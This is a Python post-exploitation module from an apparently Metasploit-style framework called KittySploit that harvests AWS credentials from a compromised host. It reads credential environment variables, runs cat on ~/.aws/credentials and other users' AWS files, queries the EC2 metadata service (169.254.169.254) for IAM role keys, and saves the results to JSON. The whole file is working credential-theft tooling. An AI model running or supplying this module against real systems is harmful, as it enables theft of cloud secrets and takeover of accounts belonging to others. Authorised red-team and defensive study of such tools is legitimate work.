#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS Credentials Enumeration Module
Author: KittySploit Team
Version: 1.0.0

This module enumerates AWS credentials from various sources:
- Environment variables
- AWS credentials files (~/.aws/credentials, ~/.aws/config)
- EC2 Instance Metadata Service (IMDS)
- IAM roles and policies
"""

from kittysploit import *
import os
import json
from core.output_handler import print_info, print_success, print_error, print_warning

class Module(Post):
    """Enumerate AWS credentials from various sources"""
    
    __info__ = {
        "name": "Enumerate AWS Credentials",
        "description": "Enumerate AWS credentials from environment variables, credential files, and EC2 metadata",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.AWS,
    }
    
    check_environment = OptBool(True, "Check environment variables for AWS credentials", False)
    check_files = OptBool(True, "Check AWS credential files (~/.aws/credentials, ~/.aws/config)", False)
    check_imds = OptBool(True, "Check EC2 Instance Metadata Service (IMDS)", False)
    check_iam = OptBool(True, "Check IAM identity and roles", False)
    output_file = OptString("", "Output file to save credentials (JSON format)", False)
    
    def run(self):
        """Run the credentials enumeration"""
        try:
            credentials_found = {}
            
            print_info("Starting AWS credentials enumeration...")
            print_info("=" * 80)
            
            # 1. Check environment variables
            if self.check_environment.value:
                print_info("\n[1] Checking environment variables...")
                env_creds = self._check_environment_variables()
                if env_creds:
                    credentials_found['environment'] = env_creds
                    print_success(f"Found credentials in environment variables")
                else:
                    print_info("No AWS credentials found in environment variables")
            
            # 2. Check credential files
            if self.check_files.value:
                print_info("\n[2] Checking AWS credential files...")
                file_creds = self._check_credential_files()
                if file_creds:
                    credentials_found['files'] = file_creds
                    print_success(f"Found credentials in files")
                else:
                    print_info("No AWS credential files found")
            
            # 3. Check EC2 Instance Metadata Service
            if self.check_imds.value:
                print_info("\n[3] Checking EC2 Instance Metadata Service (IMDS)...")
                imds_creds = self._check_imds()
                if imds_creds:
                    credentials_found['imds'] = imds_creds
                    print_success(f"Found credentials from IMDS")
                else:
                    print_info("Not running on EC2 or IMDS not accessible")
            
            # 4. Check IAM identity
            if self.check_iam.value:
                print_info("\n[4] Checking IAM identity...")
                iam_info = self._check_iam_identity()
                if iam_info:
                    credentials_found['iam'] = iam_info
                    print_success(f"Found IAM identity information")
                else:
                    print_info("Could not retrieve IAM identity")
            
            # Summary
            print_info("\n" + "=" * 80)
            print_info("ENUMERATION SUMMARY")
            print_info("=" * 80)
            
            if credentials_found:
                print_success(f"Found credentials from {len(credentials_found)} source(s)")
                
                # Display summary
                for source, creds in credentials_found.items():
                    print_info(f"\n[{source.upper()}]")
                    if isinstance(creds, dict):
                        for key, value in creds.items():
                            if 'secret' in key.lower() or 'password' in key.lower() or 'token' in key.lower():
                                # Mask sensitive values
                                if value:
                                    masked = value[:4] + "*" * (len(value) - 8) + value[-4:] if len(value) > 8 else "*" * len(value)
                                    print_info(f"  {key}: {masked}")
                                else:
                                    print_info(f"  {key}: (empty)")
                            else:
                                print_info(f"  {key}: {value}")
                
                # Save to file if requested
                if self.output_file.value:
                    try:
                        with open(self.output_file.value, 'w') as f:
                            json.dump(credentials_found, f, indent=2)
                        print_success(f"Credentials saved to {self.output_file.value}")
                    except Exception as e:
                        print_error(f"Failed to save credentials to file: {e}")
            else:
                print_warning("No AWS credentials found")
            
            return True
            
        except Exception as e:
            print_error(f"Error during enumeration: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _check_environment_variables(self):
        """Check environment variables for AWS credentials"""
        env_vars = [
            'AWS_ACCESS_KEY_ID',
            'AWS_SECRET_ACCESS_KEY',
            'AWS_SESSION_TOKEN',
            'AWS_SECURITY_TOKEN',
            'AWS_DEFAULT_REGION',
            'AWS_REGION',
            'AWS_PROFILE',
            'AWS_SHARED_CREDENTIALS_FILE',
            'AWS_CONFIG_FILE'
        ]
        
        found = {}
        for var in env_vars:
            value = self.cmd_execute(f"echo ${var}")
            if value and value.strip() and value.strip() != '':
                found[var] = value.strip()
        
        return found if found else None
    
    def _check_credential_files(self):
        """Check AWS credential files"""
        files_to_check = [
            '~/.aws/credentials',
            '~/.aws/config',
            '/root/.aws/credentials',
            '/root/.aws/config',
            '/home/*/.aws/credentials',
            '/home/*/.aws/config'
        ]
        
        found = {}
        
        # Check common locations
        for file_path in files_to_check:
            # Expand ~
            if file_path.startswith('~'):
                file_path = file_path.replace('~', '$HOME')
            
            # Check if file exists
            check_cmd = f"test -f {file_path} && echo 'exists' || echo 'not found'"
            result = self.cmd_execute(check_cmd)
            
            if result and 'exists' in result:
                # Read file content
                read_cmd = f"cat {file_path} 2>/dev/null"
                content = self.cmd_execute(read_cmd)
                
                if content:
                    found[file_path] = content
                    print_info(f"  Found: {file_path}")
        
        return found if found else None
    
    def _check_imds(self):
        """Check EC2 Instance Metadata Service"""
        found = {}
        
        # Check if we're on EC2
        imds_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://[fd00:ec2::254]/latest/meta-data/'  # IPv6
        ]
        
        # Try to access IMDS
        for endpoint in imds_endpoints:
            # Check if IMDS is accessible
            check_cmd = f"curl -s --connect-timeout 2 {endpoint} 2>/dev/null | head -1"
            result = self.cmd_execute(check_cmd)
            
            if result and result.strip():
                found['imds_accessible'] = True
                found['imds_endpoint'] = endpoint
                
                # Get instance metadata
                metadata_items = [
                    'instance-id',
                    'instance-type',
                    'ami-id',
                    'region',
                    'availability-zone',
                    'iam/security-credentials/'
                ]
                
                metadata = {}
                for item in metadata_items:
                    get_cmd = f"curl -s --connect-timeout 2 {endpoint}{item} 2>/dev/null"
                    value = self.cmd_execute(get_cmd)
                    if value and value.strip():
                        metadata[item] = value.strip()
                
                if metadata:
                    found['metadata'] = metadata
                
                # Try to get IAM role credentials
                role_cmd = f"curl -s --connect-timeout 2 {endpoint}iam/security-credentials/ 2>/dev/null"
                roles = self.cmd_execute(role_cmd)
                
                if roles and roles.strip():
                    # Get first role
                    role_name = roles.strip().split('\n')[0]
                    if role_name:
                        creds_cmd = f"curl -s --connect-timeout 2 {endpoint}iam/security-credentials/{role_name} 2>/dev/null"
                        creds_json = self.cmd_execute(creds_cmd)
                        
                        if creds_json:
                            try:
                                creds_data = json.loads(creds_json)
                                found['iam_role'] = role_name
                                found['iam_credentials'] = creds_data
                                print_success(f"  Found IAM role: {role_name}")
                            except:
                                found['iam_role'] = role_name
                                found['iam_credentials_raw'] = creds_json
                
                break
        
        return found if found else None
    
    def _check_iam_identity(self):
        """Check IAM identity using AWS CLI"""
        found = {}
        
        # Check if AWS CLI is available
        aws_check = self.cmd_execute("which aws")
        if not aws_check or 'aws' not in aws_check:
            # Try to use boto3 via Python
            python_cmd = """
python3 -c "
try:
    import boto3
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    print('USER_ID:', identity.get('UserId', ''))
    print('ARN:', identity.get('Arn', ''))
    print('ACCOUNT:', identity.get('Account', ''))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
            result = self.cmd_execute(python_cmd)
            
            if result and 'ERROR' not in result:
                for line in result.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        found[key.strip()] = value.strip()
        else:
            # Use AWS CLI
            identity_cmd = "aws sts get-caller-identity 2>/dev/null"
            result = self.cmd_execute(identity_cmd)
            
            if result:
                try:
                    identity_data = json.loads(result)
                    found = identity_data
                except:
                    found['raw'] = result
        
        return found if found else None

